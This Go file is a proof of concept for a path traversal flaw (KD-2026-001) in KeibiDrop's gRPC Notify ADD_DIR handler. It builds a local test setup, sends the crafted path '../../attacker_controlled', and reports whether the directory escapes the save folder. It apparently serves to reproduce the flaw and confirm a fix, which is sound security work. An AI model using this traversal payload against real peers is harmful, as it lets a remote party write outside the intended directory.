// ABOUTME: PoC for KD-2026-001 path traversal via gRPC Notify ADD_DIR.
// ABOUTME: Run standalone with: go run repro_traversal.go

//go:build ignore

package main

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"reflect"
	"unsafe"

	bindings "github.com/KeibiSoft/KeibiDrop/grpc_bindings"
	"github.com/KeibiSoft/KeibiDrop/pkg/filesystem"
	"github.com/KeibiSoft/KeibiDrop/pkg/logic/service"
)

func main() {
	// Setup test environment
	baseDir, _ := filepath.Abs("repro_dir")
	saveDir := filepath.Join(baseDir, "save")
	mountDir := filepath.Join(baseDir, "mount")
	// attackerDir := filepath.Join(baseDir, "attacker_controlled")

	os.RemoveAll(baseDir)
	os.MkdirAll(saveDir, 0755)
	os.MkdirAll(mountDir, 0755)

	fmt.Printf("Base Dir: %s\n", baseDir)
	fmt.Printf("Save Dir: %s\n", saveDir)

	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))

	// Initialize the FS and Service as Alice would
	fs := filesystem.NewFS(logger)

	// We need to initialize the root Dir object
	root := &filesystem.Dir{}
	root.LocalDownloadFolder = saveDir

	// --- HACK: Inject logger into unexported field ---
	rootVal := reflect.ValueOf(root).Elem()
	loggerField := rootVal.FieldByName("logger")

	// If the field name is actually something else (like 'log'), update the string above
	if loggerField.IsValid() {
		// Bypass Go's unexported field protection
		ptr := unsafe.Pointer(loggerField.UnsafeAddr())
		reflect.NewAt(loggerField.Type(), ptr).Elem().Set(reflect.ValueOf(logger))
		fmt.Println("Successfully injected logger into unexported field.")
	} else {
		fmt.Println("Warning: Could not find unexported 'logger' field via reflection.")
	}
	// --------------------------------------------------

	kdSvc := &service.KeibidropServiceImpl{
		Logger: logger,
		FS:     fs,
	}

	fs.Root = root

	maliciousPath := "../../attacker_controlled"

	req := &bindings.NotifyRequest{
		Type: bindings.NotifyType_ADD_DIR,
		Path: maliciousPath,
	}

	fmt.Println("Attempting Path Traversal via Notify (ADD_DIR)...")
	_, err := kdSvc.Notify(context.Background(), req)
	if err != nil {
		fmt.Printf("Notify returned error: %v\n", err)
	}

	// Check if attackerDir exists
	// 1. Check where the PoC originally expected it (1 level above saveDir)
	expectedAttackerDir := filepath.Join(baseDir, "attacker_controlled")

	// 2. Check if the payload went up TWO levels (Parent of baseDir)
	twoLevelsUpDir := filepath.Join(baseDir, "..", "attacker_controlled")

	// 3. Check if it was sanitized and dropped safely INSIDE saveDir
	sanitizedDir := filepath.Join(saveDir, "attacker_controlled")

	fmt.Println("\n--- Hunting for the directory ---")
	if _, err := os.Stat(expectedAttackerDir); err == nil {
		fmt.Printf("[!] VULNERABLE: Found at expected 1-level traversal: %s\n", expectedAttackerDir)
	} else if _, err := os.Stat(twoLevelsUpDir); err == nil {
		fmt.Printf("[!] VULNERABLE: Found at 2-level traversal! Payload went higher than expected: %s\n", twoLevelsUpDir)
	} else if _, err := os.Stat(sanitizedDir); err == nil {
		fmt.Printf("[+] SECURE: Payload was sanitized. Directory safely created inside saveDir: %s\n", sanitizedDir)
	} else {
		fmt.Println("[?] MYSTERY: Directory not found in any expected location. KeibiDrop might be ignoring the request entirely despite the 'Success' log.")
	}
}
